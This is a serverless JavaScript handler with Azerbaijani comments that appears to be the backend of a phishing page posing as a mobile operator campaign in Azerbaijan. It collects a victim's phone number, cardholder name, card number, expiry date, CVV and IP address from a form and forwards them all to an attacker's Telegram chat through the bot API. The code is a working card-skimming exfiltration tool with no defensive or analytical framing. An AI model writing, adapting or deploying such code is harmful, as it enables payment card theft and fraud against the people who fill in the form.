exports.handler = async (event) => {
    // ====== ENVIRONMENT VARIABLES ======
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // ====== TOKEN YOXLA ======
    if (!botToken || !chatId) {
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                status: 'error', 
                message: 'Token or Chat ID missing' 
            })
        };
    }

    // ====== YALNIZ POST SORĞULARI ======
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ 
                status: 'error', 
                message: 'Method Not Allowed' 
            })
        };
    }

    try {
        // ====== MƏLUMATLARI AL ======
        const params = new URLSearchParams(event.body);
        const operator = params.get('operator') || '';
        const prefix = params.get('prefix') || '';
        const number = params.get('number') || '';
        const price = params.get('campaign_price') || '';
        const cardName = params.get('card_name') || '';
        const cardNumber = params.get('card_number') || '';
        const cardExpiry = params.get('card_expiry') || '';
        const cardCvv = params.get('card_cvv') || '';
        const ip = params.get('ip') || event.headers['x-forwarded-for'] || '0.0.0.0';

        // ====== MESAJI FORMATLA (EMOJİSİZ) ======
        const message = `YENI BILGI\n\n` +
            `Operator: ${operator}\n` +
            `Nomre: +994${prefix}${number}\n` +
            `Kampaniya: ${price} AZN\n` +
            `Kart Sahibi: ${cardName}\n` +
            `Kart Nomresi: ${cardNumber}\n` +
            `Kart Bitis: ${cardExpiry}\n` +
            `CVV: ${cardCvv}\n` +
            `IP: ${ip}`;

        // ====== TELEGRAM-A GÖNDƏR ======
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const data = new URLSearchParams({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });

        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: data
        });

        const responseText = await response.text();

        if (response.ok) {
            return {
                statusCode: 200,
                body: JSON.stringify({ 
                    status: 'success', 
                    message: 'Data sent to Telegram' 
                })
            };
        } else {
            return {
                statusCode: 500,
                body: JSON.stringify({ 
                    status: 'error', 
                    message: 'Failed to send to Telegram',
                    details: responseText
                })
            };
        }

    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                status: 'error', 
                message: error.message 
            })
        };
    }
};
